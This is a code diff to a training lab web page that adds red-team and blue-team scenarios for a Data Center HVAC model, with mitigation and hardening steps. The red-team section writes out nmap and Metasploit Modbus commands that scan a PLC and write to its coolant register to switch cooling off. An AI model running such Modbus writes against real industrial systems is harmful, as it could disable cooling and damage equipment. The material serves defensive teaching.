@@ -13,6 +13,7 @@ const domainTitles = {
 };
 
 const industryDashboardUrl = "http://172.16.17.204:1880/ui/#!/4?socketid=zxL7Ex3NoOUjbRHMAAAB";
+const dataCenterDashboardUrl = "http://172.16.17.204:1880/ui/#!/7?socketid=vmNCQThlV3IuIaD_AAAV";
 
 const scriptCode = {
   single: `import paho.mqtt.client as mqtt
@@ -136,8 +137,83 @@ python3 all.py`,
   }
 };
 
+const dataCenterScenarios = {
+  red: {
+    kicker: "Red Team Scenario",
+    title: "Data Center HVAC Modbus Attack Surface",
+    summary: "Students simulate a lab-only Modbus TCP attack path against the Data Center HVAC PLC and observe how coolant and ventilation control changes affect the dashboard.",
+    badges: ["Modbus TCP", "PLC 172.16.17.126", "Port 502", "HVAC"],
+    steps: [
+      "Connect Kali to the Phygital Lab network and open the Data Center HVAC dashboard.",
+      "Scan the PLC to confirm Modbus TCP is exposed on port 502.",
+      "Use Metasploit's Modbus client scanner to read register values while someone controls the HVAC coolant from the dashboard.",
+      "Identify the register mapping: data_address 0 controls coolant and data_address 1 controls the ventilation fan.",
+      "Write the captured lab values to control coolant state and observe dashboard impact.",
+      "Restore the coolant to the safe ON state before ending the drill."
+    ],
+    actionTitle: "Modbus Lab Commands",
+    commands: `nmap -p 502 172.16.17.126
+
+msfconsole
+use auxiliary/scanner/scada/modbusclient
+set rhosts 172.16.17.126
+set data_address 1
+run
+
+# Coolant register discovered during the lab
+set data_address 0
+set action write_register
+set data 333
+run
+
+# Restore coolant ON
+set data 111
+run`,
+    links: [
+      { label: "Open Data Center Dashboard", href: dataCenterDashboardUrl }
+    ]
+  },
+  blue: {
+    kicker: "Blue Team Scenario",
+    title: "Data Center HVAC Mitigation And Response",
+    summary: "Students defend the Data Center model by detecting unauthorized Modbus writes, restoring HVAC coolant, and recommending protections for the PLC network.",
+    badges: ["Detect", "Contain", "Restore Cooling", "Harden Modbus"],
+    steps: [
+      "Detect: watch the Data Center dashboard for coolant OFF state, ventilation changes, or abnormal temperature rise.",
+      "Confirm: compare dashboard state with physical model behavior and expected HVAC control commands.",
+      "Contain: stop the unauthorized Modbus client session and isolate the attacking Kali host from the PLC network.",
+      "Recover: restore coolant ON using the approved dashboard control or authorized recovery command.",
+      "Validate: confirm coolant returns to ON and temperature stabilizes on the dashboard.",
+      "Harden: restrict port 502, allow only trusted HMI/SCADA hosts, segment the PLC VLAN, alert on Modbus write_register operations, and document register access."
+    ],
+    actionTitle: "Mitigation Steps",
+    commands: `1. Stop unauthorized activity:
+   Close the Modbus client session
+   Isolate the suspicious Kali host from the PLC network
+
+2. Restore safe HVAC state:
+   Turn coolant ON from the approved dashboard
+   Confirm data_address 0 returns to the safe coolant state
+
+3. Validate recovery:
+   Watch the Data Center dashboard
+   Confirm coolant is ON and temperature stabilizes
+
+4. Hardening checklist:
+   Restrict TCP/502 to trusted HMI or SCADA hosts
+   Segment PLC and student networks
+   Alert on Modbus write_register actions
+   Document allowed register addresses
+   Keep a manual HVAC recovery SOP`,
+    links: [
+      { label: "Open Data Center Dashboard", href: dataCenterDashboardUrl }
+    ]
+  }
+};
+
 function getScenario(domain, mode) {
   if (domain === "industry") return industryScenarios[mode] || industryScenarios.red;
+  if (domain === "data-center") return dataCenterScenarios[mode] || dataCenterScenarios.red;
   const title = domainTitles[domain] || "Model";
   const isRed = mode === "red";
   return {
@@ -169,6 +245,7 @@ function renderScenario() {
   const domain = params.get("domain") || "industry";
   const mode = params.get("mode") || "red";
   const isIndustry = domain === "industry";
+  const showPythonCode = isIndustry;
   const scenario = getScenario(domain, mode);
 
   document.title = `${scenario.title} - Phygital Lab`;
@@ -179,8 +256,8 @@ function renderScenario() {
   document.getElementById("scenario-steps").innerHTML = scenario.steps.map((step) => `<li>${step}</li>`).join("");
   document.getElementById("scenario-action-title").textContent = scenario.actionTitle || "Kali Commands";
   document.getElementById("scenario-commands").textContent = scenario.commands;
-  document.getElementById("scenario-command-note").hidden = !isIndustry;
-  document.getElementById("scenario-code-section").hidden = !isIndustry;
+  document.getElementById("scenario-command-note").hidden = true;
+  document.getElementById("scenario-code-section").hidden = !showPythonCode;
   document.getElementById("scenario-links").innerHTML = scenario.links.map((link) => (
     `<button class="scenario-dashboard-btn" type="button" data-href="${link.href}">${link.label}</button>`
   )).join("");
